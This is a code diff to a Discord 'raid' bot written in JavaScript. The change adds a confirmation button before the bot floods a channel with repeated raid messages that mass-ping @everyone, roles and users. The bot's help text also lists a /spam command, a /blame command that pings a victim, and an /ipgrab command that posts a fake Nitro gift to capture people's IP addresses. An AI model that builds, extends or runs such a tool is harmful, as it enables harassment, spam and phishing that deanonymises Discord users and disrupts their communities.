@@ -27,6 +27,11 @@ const RAID_MESSAGE_LONG = [
   '-# Want to raid other servers? Join us.',
   'https://discord.gg/3RhaMXkRnS',
 ].join('\n');
+
+const RAID_MESSAGES = {
+  short: RAID_MESSAGE_SHORT,
+  long: RAID_MESSAGE_LONG,
+};
 // ---------------------------------
 
 const MENTIONS = { parse: ['everyone', 'roles', 'users'] };
@@ -42,8 +47,8 @@ const HELP_EMBED = new EmbedBuilder()
   .setTitle('Commands')
   .setDescription('Here is everything this bot can do:')
   .addFields(
-    { name: '/raid', value: 'short raid — fires the short raid text.' },
-    { name: '/raid2', value: 'long arabic symbol raid — fires the long ﷽ raid text.' },
+    { name: '/raid', value: 'short raid — hit the button to fire the short raid text.' },
+    { name: '/raid2', value: 'long arabic symbol raid — hit the button to fire the long ﷽ raid text.' },
     { name: '/spam <message>', value: 'Repeats your message multiple times. You type the text once, hit the button, and it fires.' },
     { name: '/blame <victim>', value: 'Blames someone for the raid and pings them.' },
     { name: '/ipgrab <amount>', value: 'Drops a fake Discord Nitro gift. Pick how many times (1-5) and hit **send**.' },
@@ -62,14 +67,27 @@ client.on(Events.InteractionCreate, async interaction => {
       return interaction.reply({ embeds: [HELP_EMBED], flags: MessageFlags.Ephemeral });
     }
 
-    // ---------------- /raid  &  /raid2 ----------------
+    // ---------------- /raid  &  /raid2  -> ask first, button fires it ----------------
     if (interaction.isChatInputCommand() &&
         (interaction.commandName === 'raid' || interaction.commandName === 'raid2')) {
 
-      const isLong  = interaction.commandName === 'raid2';
-      const message = isLong ? RAID_MESSAGE_LONG : RAID_MESSAGE_SHORT;
-      const count   = isLong ? RAID_COUNT_LONG  : RAID_COUNT_SHORT;
-      const pause   = isLong ? 300 : 0; // long text needs a bit more air
+      const variant = interaction.commandName === 'raid2' ? 'long' : 'short';
+
+      const row = new ActionRowBuilder().addComponents(
+        new ButtonBuilder()
+          .setCustomId(`raid:${variant}`)
+          .setLabel('raid')
+          .setStyle(variant === 'long' ? ButtonStyle.Secondary : ButtonStyle.Primary)
+      );
+
+      return interaction.reply({ content: 'start raid?', components: [row], flags: MessageFlags.Ephemeral });
+    }
+
+    if (interaction.isButton() && interaction.customId.startsWith('raid:')) {
+      const variant = interaction.customId.slice(5);              // 'short' | 'long'
+      const message = RAID_MESSAGES[variant] ?? RAID_MESSAGE_SHORT;
+      const count   = variant === 'long' ? RAID_COUNT_LONG : RAID_COUNT_SHORT;
+      const pause   = variant === 'long' ? 300 : 0;               // long text needs a bit more air
 
       await interaction.reply({ content: message, allowedMentions: MENTIONS });
       for (let i = 1; i < count; i++) {
